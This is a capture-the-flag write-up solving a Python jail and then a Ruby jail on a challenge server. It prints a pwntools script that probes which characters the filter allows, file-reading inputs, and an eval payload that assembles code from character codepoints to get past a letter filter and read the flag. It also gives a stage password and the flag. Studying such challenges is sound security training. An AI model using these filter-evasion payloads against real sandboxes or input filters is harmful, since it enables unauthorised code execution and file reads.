---
layout: writeup
category: Hackappatoi-CTF-2023
chall_description:
points: 310
solves: N/A
tags: misc misc/pyjail misc/ruby-jail
date: 2023-12-10
comments: false
---

Italy is maybe the most touristic country around the world, amazing food, spectacular monuments, and faboulus environments  

But in the last period Italy don't wanna let anyone escape...  

`nc 92.246.89.201 8888`  

---

Connect to the service. Here's what it shows:  

```py



                              ΓûêΓûê              ΓûêΓûê
                            ΓûêΓûê              ΓûêΓûê
                          ΓûêΓûê        ΓûêΓûê    ΓûêΓûê
                          ΓûêΓûê      ΓûêΓûê      ΓûêΓûê
                            ΓûêΓûê    ΓûêΓûê        ΓûêΓûê
            ΓûæΓûæΓûæΓûæ              ΓûÆΓûÆ  ΓûêΓûê          ΓûÆΓûÆ  ΓûæΓûæ
                              ΓûêΓûê    ΓûêΓûê        ΓûêΓûê
                            ΓûêΓûê        ΓûêΓûê    ΓûêΓûê
                                      ΓûêΓûê  ΓûêΓûê
                                    ΓûêΓûê
                                                  ΓûæΓûæ
                  ΓûêΓûêΓûêΓûêΓûêΓûê        ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûê
                ΓûêΓûê      ΓûêΓûê    ΓûêΓûê            ΓûêΓûê
              ΓûêΓûê    ΓûêΓûêΓûêΓûê  ΓûêΓûêΓûêΓûê    ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûê    ΓûêΓûê              ΓûêΓûêΓûêΓûê
            ΓûêΓûê    ΓûêΓûê    ΓûêΓûêΓûêΓûê    ΓûêΓûê        ΓûêΓûê    ΓûêΓûêΓûêΓûêΓûêΓûê      ΓûêΓûê    ΓûêΓûê
            ΓûêΓûê  ΓûêΓûê  ΓûêΓûêΓûêΓûêΓûêΓûê    ΓûêΓûê    ΓûêΓûêΓûêΓûê    ΓûêΓûê    ΓûêΓûê  ΓûêΓûê  ΓûêΓûê        ΓûêΓûê
          ΓûêΓûê  ΓûôΓûô  ΓûêΓûê  ΓûêΓûê    ΓûêΓûê    ΓûêΓûê    ΓûêΓûê    ΓûêΓûê    ΓûôΓûô  ΓûôΓûô          ΓûêΓûê
          ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûê    ΓûêΓûê
            ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûê      ΓûêΓûêΓûêΓûê    ΓûêΓûê
            ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûê      ΓûêΓûêΓûêΓûê  ΓûêΓûê
              ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûôΓûôΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûê      ΓûêΓûêΓûêΓûê    ΓûêΓûê
                ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûê    ΓûêΓûêΓûêΓûêΓûêΓûê        ΓûêΓûê
                  ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûê  ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûê
                      ΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûôΓûôΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûôΓûôΓûôΓûô





≡ƒì┤≡ƒì┤≡ƒì┤
```

The challenge clearly implies this is some sort of code jail. These are typically pyjails -- let's test it out.  

Sending `print` returns `<built-in function print>`, which pretty much confirms this is a pyjail. I immediately decided to try a naive method to get the flag.  

```py
print(open('flag.txt', 'r').read())
```

Output:  

```
read key

None
```

Hey... that worked? No keywords or anything were blacklisted? Well, let's check out `key` anyways.  

```py
print(open('key', 'r').read())
```

```
guera

Yep, not the flag..., use 'guera' as the password for the real challenge at port 8889

None
```

Ah. So there's a part 2 to this challenge. Let's check it out!  

Here's what we're presented with after sending the key, `guera`:  

```
Oh Oh you escaped from a pasta jail..., can you escape from a bank and steal a precious ruby?...


Welcome to:
HACKAPPATOI's Jewelry (We got funds from zio Berlusca)
Here you will find a magnific 1337 Jewel

        _______
      .'_/_|_\_'.
      \`\  |  /`/
       `\\ | //'
         `\|/`
           `

But you need to obtain it and it won't be so easy...
You have a command to get it....
Good Luck!
Enter command:
```

Another pyjail? Let's try sending `print`:  

`Oopsie.. your input is bad... We blocked it.`  

Not sure if it's Python yet, but definitely some blacklisting going on. Let's try some random letters. Eventually, with the input `a`, I got this:  

```
(eval):1:in `<main>': undefined local variable or method `a' for main:Object (NameError)
        from jewelry.rb:40:in `eval'
        from jewelry.rb:40:in `<main>'
```

`.rb`...? Isn't that a Ruby file? So this must be a Ruby jail!  

With further testing, I quickly realized a lot of characters were blacklisted. Hence, I wrote a quick script to test which ones were blacklisted:  

```py
# print(open('flag.txt', 'r').read())
# print(open('key', 'r').read())
# pass is 'guera'

from pwn import *
import string

posschars = string.ascii_letters + string.digits + string.punctuation
validchars = []
for i in posschars:
    conn = remote('92.246.89.201', 8889)
    conn.recv()
    conn.sendline(b'guera')
    conn.recv()
    conn.recv()
    conn.sendline(i.encode())
    res = conn.recv().decode()
    conn.close()
    if 'Oops' not in res:
        validchars.append(i)
        print(res)

print(validchars)
```

Testing revealed that these characters...  

```py
['a', 'e', 'l', 'v', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', ':', ';', '<', '=', '>', '?', '@','[', '\\', ']', '^', '`', '{', '|', '}', '~']
```

...were the only allowed characters. That's odd... only `aelv` are allowed of the lowercase letters, and, importantly, these spell out `eval`. Maybe that'll be important to the challenge?  

At this point, since I had never even used Ruby before, much less broken a Ruby jail, I started doing a lot of research and playing around with the service. I tried octal numbers, global variables, predefined constants, etc etc. Overall, I ended up being stuck for over an hour on this section of the problem. Eventually, my search query of `ruby jail without letters ctf` returned results. The reason I wanted to find some sort of hint to breaking a ruby jail without letters was because a lot of lowercase letters were restricted, so if I could find a way to break it without letters, I could easily break the jail. (in hindsight, I should have searched this up much earlier!)  

Scrolling down a bit, I found [this writeup](https://ctftime.org/writeup/16824) on CTFtime. Take a look at this section:  

>[This article](https://threeifbywhiskey.github.io/2014/03/05/non-alphanumeric-ruby-for-fun-and-not-much-else/) describes how you can write ruby code without letters, and since we are able to use the quote sign ', we can create strings with the shovel operator trick they describe.  

I immediately took a look through the article and found this section:  


>Logically enough, it can “shovel” strings into each other. This doesn’t quite help us, of course, as we’re not allowed to create explicit character strings. We can, however, shovel Unicode codepoints into strings to achieve the same effect:  
>
>```rb
>'' << 97 << 98 << 99
># "abc"
>```

So we don't need letters at all to construct our inputs! Perfect!  

Now all that's left to do is construct our payload. With the help of [this](https://onlinetools.com/ascii/convert-ascii-to-decimal) decimal to ASCII converter and [this](http://www.unit-conversion.info/texttools/replace-text/) online replace string helper, I was able to construct our payload pretty easily. At first, trying to open `flag.txt` didn't work, but then, trying `flag` did!  

Here is the ASCII:  

```rb
puts File.open("flag").read
```

And here is the payload to send to the service:  

```rb
eval(''<<112<<117<<116<<115<<32<<70<<105<<108<<101<<46<<111<<112<<101<<110<<40<<34<<102<<108<<97<<103<<34<<41<<46<<114<<101<<97<<100)
```  

And sending it produces the flag!  

    HCTF{1s_d1z_r34l1ty_0r_F1c710n?}  

Thoughts: As a complete newbie to both pyjails and ruby, I was pretty proud of this solve! Although it did take me quite a long time to solve, I thought I managed to figure out everything by the end quite nicely :)  